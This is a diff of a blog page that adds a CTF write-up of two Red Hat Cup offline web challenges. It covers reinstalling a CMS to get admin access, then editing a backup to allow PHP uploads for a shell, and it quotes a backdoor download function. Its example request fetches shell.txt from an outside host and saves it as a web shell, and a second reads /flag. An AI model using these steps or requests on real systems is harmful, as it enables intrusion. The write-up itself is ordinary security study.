@@ -3,7 +3,7 @@
   <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
     
-    <title>archive_a: 2019/11 | Xiao Leung&#39;s Blog</title>
+    <title>红帽杯线下部分 writeup | Xiao Leung&#39;s Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
     
@@ -74,93 +74,92 @@
 <!--文章列表-->
 <div class="wrapper">
   
-    <ul class="posts-list mb+ js-posts">
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-            <i class="post-status iconfont icon-icon"></i>  
-          
-          <h2 class="no-background"  >
-            <span><a href="/2019/11/29/2019-11-29-复现强网杯线下赛CSCMS/">复现强网杯线下赛CSCMS--SSIT模板注入</a></span>
-            <time class="post-time" datetime="2019-11-29T14:22:35.000Z" itemprop="datePublished">2019-11-29</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/2019/11/22/红帽杯线下/">红帽杯线下部分 writeup</a></span>
-            <time class="post-time" datetime="2019-11-22T14:28:47.000Z" itemprop="datePublished">2019-11-22</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/2019/11/14/2019-11-14-Volatility内存取证学习/">Volatility内存取证学习-复盘红帽杯Advertising for Marriage</a></span>
-            <time class="post-time" datetime="2019-11-14T14:17:16.000Z" itemprop="datePublished">2019-11-14</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/2019/11/02/2019-11-2-上海大学生联赛部分write-up/">上海大学生联赛部分write up</a></span>
-            <time class="post-time" datetime="2019-11-02T14:28:47.000Z" itemprop="datePublished">2019-11-02</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/2019/11/02/2019-11-2-复现CISCN2019-华北赛区-Day1-Web5]CyberPunk/">复现CISCN2019 华北赛区 Day1 Web5]CyberPunk</a></span>
-            <time class="post-time" datetime="2019-11-02T14:28:47.000Z" itemprop="datePublished">2019-11-02</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/2019/11/01/2019-11-1-PHP-SESSION反序列化——复现巅峰极客一道WEB题/">PHP-SESSION反序列化——复现巅峰极客一道WEB题</a></span>
-            <time class="post-time" datetime="2019-11-01T15:06:32.000Z" itemprop="datePublished">2019-11-01</time>
-          </h2>
-        </li>
-      
-    </ul>
-    
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      红帽杯线下部分 writeup
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<h1 id="粤湾期货"><a href="#粤湾期货" class="headerlink" title="粤湾期货"></a>粤湾期货</h1><ul>
+<li>首先直奔<code>install.php</code>发现源码中并没有做出重装限制，并且在<code>config.php</code>可以知道数据库和账号密码直接重装系统拿下后台。</li>
+<li>拿下后台发现系统设置处可以修改上传文件类型。</li>
+</ul>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191123/15745165921699.png" alt="img"></p>
+<ul>
+<li>但是加入php后缀你发现会将phpt替换为X,从源码中可有很直观看到这点。</li>
+</ul>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191123/15745169665422.png" alt="img"></p>
+<ul>
+<li>此时毫无头绪，代码审计数量太大，所以黑盒测试一下，发现数据备份处可以执行sql语句。本以为可以直接写文件，但是失败了，联想到上面上传文件后缀我们可以直接在备份文件里面修改后缀是PHP，最后直接getshell即可。</li>
+</ul>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191123/15745175748287.png" alt="img"></p>
+<ul>
+<li>导入备份后发现设置中的上传后缀有php</li>
+</ul>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191123/15745180341751.png" alt="img"></p>
+<ul>
+<li>直接上传php文件直接getshell</li>
+</ul>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191123/15745181028456.png" alt="img"></p>
+<h1 id="粤湾基金"><a href="#粤湾基金" class="headerlink" title="粤湾基金"></a>粤湾基金</h1><p>/index.php/home/test存在一处后门直接可getflag</p>
+<pre><code>// /Home/Test/dlfile?file_url=http://xxxx/shell.txt&amp;save_to=/var/www/html/shell.php
+///Home/Test/dlfile?file_url=file:///flag&amp;save_to=/var/www/html/1.txt
+    // 下载图片
+public function dlfile($file_url, $save_to)
+{
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_POST, 0); 
+        curl_setopt($ch,CURLOPT_URL,$file_url); 
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+        $file_content = curl_exec($ch);
+        curl_close($ch);
+        $downloaded_file = fopen($save_to, &#39;w&#39;);
+        fwrite($downloaded_file, $file_content);
+        fclose($downloaded_file);
+}</code></pre>
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2019-11-22T14:28:47.000Z" itemprop="datePublished">2019-11-22</time>
+	</div>
+</article>
+
+<!--评论-->
+
+	
+<div class="ds-thread" data-thread-key="红帽杯线下" data-title="红帽杯线下部分 writeup" data-url="http://www.plasf.cn/2019/11/22/红帽杯线下/"></div>
+<script type="text/javascript">
+
+var duoshuoQuery = {short_name:"yumemor"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0]
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+</script>
+
 
   
 </div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
 
 
 
